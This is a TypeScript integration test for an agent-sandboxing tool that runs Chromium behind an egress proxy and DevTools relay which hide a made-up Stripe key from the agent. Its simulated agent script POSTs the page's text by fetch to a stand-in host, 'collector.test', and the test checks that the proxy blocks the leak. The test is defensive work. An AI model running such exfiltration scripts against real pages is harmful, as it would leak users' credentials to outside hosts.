/**
 * browser-launch — a `mandu --browser` launch's Chrome
 * (docs/design/agents/devtools-relay.md §6.4) as the launcher starts it: the
 * launcher's own `startBrowser` (launcher/src/services/browser.ts) starts a
 * REAL headless Chromium on its own profile, its traffic through a REAL
 * NetProxy on its TLS-inspected leg (trusting the session CA by its pin, the
 * proxy sending the CA with each leaf), and the launcher's `startCdpRelay`
 * puts the REAL relay process in front of it, on a real ArbiterServer with a
 * `.env` bound to `shop.test` by policy.yaml.
 *
 * The websites are loopback HTTPS recorders the proxy routes `shop.test` and
 * `collector.test` to (mock-sites host routes): neither name resolves, so
 * whatever reaches them went through the proxy. Then:
 *   - the agent, through the relay, reads the shop's page: it loaded over
 *     HTTPS through the proxy (the pin works), and the key is its placeholder;
 *   - a script the agent runs in the page posts the page's text (the REAL
 *     key, in Chrome) to collector.test: the proxy refuses it, the collector
 *     gets nothing;
 *   - the same script posting to the shop, the host the key is bound to:
 *     the shop gets the real key;
 *   - a post without the key to collector.test goes through.
 *
 * Self-SKIP without a headless Chromium (tests/lib/chromium.ts) or openssl.
 * Made-up secrets. Secrets axes, explicit.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { createServer as createHttpsServer } from "node:https";
import type { IncomingMessage, ServerResponse } from "node:http";
import type { AddressInfo } from "node:net";
import { once } from "node:events";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { MockSites } from "../../interceptors/net-proxy/src/mock-sites.js";
import { ensureCa, leafForHost, opensslAvailable } from "../../interceptors/net-proxy/src/ca.js";
import { startBrowser } from "../../launcher/src/services/browser.js";
import { startCdpRelay } from "../../launcher/src/services/cdp-relay.js";
import { Layout } from "../../launcher/src/services/layout.js";
import { realDeps } from "../../launcher/src/services/primitives.js";
import { browserCdpAgentEnv } from "../../launcher/src/browser-cdp.js";
import { READY, chromiumBinary } from "../lib/chromium.js";
import { stateAxes } from "../lib/axes.js";

stateAxes("secrets");

const REPO = resolve(dirname(fileURLToPath(import.meta.url)), "..", "..");
const KEY = "sk_" + "live_51BrowserLaunchStackQz8Wm3Lp6";
const SESSION = "s-browser-launch";
const BIN = chromiumBinary();
const SKIP = BIN === null ? "no headless Chromium (MANDU_TEST_CHROMIUM)" : !opensslAvailable() ? "openssl unavailable" : false;

interface Got { host: string; method: string; url: string; body: string }

/** A website: GET / is a page showing the key, a POST is recorded. */
async function site(dir: string, host: string, got: Got[]) {
  const ca = ensureCa(join(dir, `ca-${host}`));
  const leaf = leafForHost(ca, host);
  const server = createHttpsServer({ key: leaf.keyPem, cert: leaf.certPem }, (req: IncomingMessage, res: ServerResponse) => {
    const chunks: Buffer[] = [];
    req.on("data", (c: Buffer) => chunks.push(c));
    req.on("end", () => {
      if (req.method === "POST") got.push({ host, method: "POST", url: req.url ?? "", body: Buffer.concat(chunks).toString("utf8") });
      res.writeHead(200, { "content-type": "text/html; charset=utf-8", "access-control-allow-origin": "*" });
      res.end(req.method === "POST" ? "saved" : `<!doctype html><title>Integrations</title><p>Stripe secret key ${KEY}</p>`);
    });
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  return { port: (server.address() as AddressInfo).port, caPath: ca.certPath, close: () => server.close() };
}

/** A DevTools client over Node's WebSocket, flat-session aware. */
async function cdp(wsUrl: string) {
  const ws = new WebSocket(wsUrl);
  await new Promise<void>((ok, bad) => {
    ws.addEventListener("open", () => ok(), { once: true });
    ws.addEventListener("error", () => bad(new Error(`nothing at ${wsUrl}`)), { once: true });
  });
  const waiting = new Map<number, (m: any) => void>();
  const all: any[] = [];
  ws.addEventListener("message", (ev) => {
    const m = JSON.parse(String(ev.data));
    all.push(m);
    if (typeof m.id === "number") waiting.get(m.id)?.(m);
  });
  let id = 1;
  return {
    all,
    send(method: string, params: Record<string, unknown> = {}, sessionId?: string): Promise<any> {
      const my = id++;
      return new Promise((r) => { waiting.set(my, r); ws.send(JSON.stringify({ id: my, method, params, ...(sessionId ? { sessionId } : {}) })); });
    },
    close: () => ws.close(),
  };
}

test("mandu --browser: Chrome through the egress proxy and behind the relay; a page script's send of the real key is refused off its host", { skip: SKIP, timeout: 120_000 }, async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-browser-launch-"));
  const env = join(tmp, ".env");
  writeFileSync(env, `STRIPE_KEY=${KEY}\n`);
  const policy = join(tmp, "policy.yaml");
  writeFileSync(policy, ["version: 1", "paths:", `  - path: ${env}`, "    level: no-model", "    bindings: [shop.test]", ""].join("\n"));
  const sock = join(tmp, "a.sock");
  const humanSock = join(tmp, "h", "h.sock");
  const server = new ArbiterServer({
    socketPath: sock, adminSocketPath: join(tmp, "admin.sock"), humanSocketPath: humanSock,
    dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), log: () => {},
    confidentiality: true, integrity: false, policyPath: policy, policyPollMs: 0,
  });
  await server.listen();
  const data = new ArbiterClient(sock);
  const human = new ArbiterClient(humanSock);
  await data.connect();
  await human.connect();
  const reg = await human.registerSecret({ path: env, sessionKey: SESSION });
  assert.match(String(reg.symbol), /^\$MDU:/);

  const got: Got[] = [];
  const shop = await site(tmp, "shop.test", got);
  const collector = await site(tmp, "collector.test", got);
  const route = (host: string, s: { port: number; caPath: string }) =>
    [`  - host: ${host}`, `    to: 127.0.0.1:${s.port}`, `    tls_to: 127.0.0.1:${s.port}`, `    tls_ca: ${JSON.stringify(s.caPath)}`];
  const caDir = join(tmp, "mitm");
  const proxy = new NetProxy({
    arbiter: new ArbiterClientAdapter(data as unknown as RealArbiterClient, human as unknown as RealArbiterClient),
    log: () => {}, sessionId: SESSION,
    mockSites: MockSites.fromYaml(["hosts:", ...route("shop.test", shop), ...route("collector.test", collector), ""].join("\n")),
    mitm: { caDir },
  });
  const proxyPort = await proxy.listen(0);

  let browser: Awaited<ReturnType<typeof startBrowser>> | null = null;
  let relay: Awaited<ReturnType<typeof startCdpRelay>> | null = null;
  let a: Awaited<ReturnType<typeof cdp>> | null = null;
  try {
    browser = await startBrowser(
      { netProxy: { host: "127.0.0.1", port: proxyPort }, mitmCaCert: join(caDir, "mandu-egress-ca.pem") },
      tmp, realDeps,
      { env: { ...process.env, MANDU_BROWSER_BIN: BIN!, MANDU_BROWSER_HEADLESS: "1", MANDU_BROWSER_NO_SANDBOX: "1" }, profile: join(tmp, "profile") },
    );
    assert.equal(browser.note, null, "every request Chrome makes is gated");
    relay = await startCdpRelay({ browserCdp: browser.endpoint, arbiterSock: sock, arbiterHumanSock: humanSock, scopeId: SESSION }, Layout.dev(REPO), tmp, realDeps);
    const bu = browserCdpAgentEnv(relay.url)["BU_CDP_URL"]!;
    const v = (await (await fetch(`${bu}/json/version`)).json()) as { webSocketDebuggerUrl: string };
    a = await cdp(v.webSocketDebuggerUrl);

    const target = await a.send("Target.createTarget", { url: "https://shop.test/" });
    const att = await a.send("Target.attachToTarget", { targetId: String(target.result?.targetId), flatten: true });
    const sid = String(att.result?.sessionId);
    let ready = false;
    for (let i = 0; i < 150 && !ready; i++) {
      const r = await a.send("Runtime.evaluate", { expression: READY, returnByValue: true }, sid);
      ready = r.result?.result?.value === true;
      if (!ready) await new Promise((r2) => setTimeout(r2, 100));
    }
    assert.ok(ready, "the shop's HTTPS page loaded through the proxy (Chrome trusted the session CA by its pin)");
    const read = await a.send("Runtime.evaluate", { expression: "document.body.innerText", returnByValue: true }, sid);
    const text = String(read.result?.result?.value);
    assert.match(text, /Stripe secret key \$MDU:/, "the agent reads the key as its placeholder");
    assert.ok(!text.includes(KEY));

    // A script the agent runs in the page: it sends what the page holds.
    const send = async (url: string, body: string): Promise<string> => {
      const r = await a!.send("Runtime.evaluate", {
        expression: `fetch(${JSON.stringify(url)}, { method: "POST", mode: "no-cors", body: ${body} }).then(() => "sent", (e) => "failed: " + e)`,
        awaitPromise: true, returnByValue: true,
      }, sid);
      return String(r.result?.result?.value);
    };
    await send("https://collector.test/c", "document.body.innerText");
    assert.ok(!got.some((g) => g.host === "collector.test"), `the collector got nothing: ${JSON.stringify(got)}`);
    await send("https://shop.test/save", "document.body.innerText");
    const saved = got.filter((g) => g.host === "shop.test");
    assert.equal(saved.length, 1, JSON.stringify(got));
    assert.ok(saved[0]!.body.includes(KEY), "the shop, the key's own host, got the real key");
    await send("https://collector.test/c", JSON.stringify("hello"));
    const benign = got.filter((g) => g.host === "collector.test");
    assert.deepEqual(benign.map((g) => g.body), ["hello"], "a post without the key goes through: the refusal was the key's");
    assert.ok(!JSON.stringify(a.all).includes(KEY), "nothing the agent got carried the value");
  } finally {
    a?.close();
    relay?.stop();
    browser?.stop();
    await new Promise((r) => setTimeout(r, 500));
    await proxy.close();
    shop.close();
    collector.close();
    data.close();
    human.close();
    await server.close();
    rmSync(tmp, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
  }
});
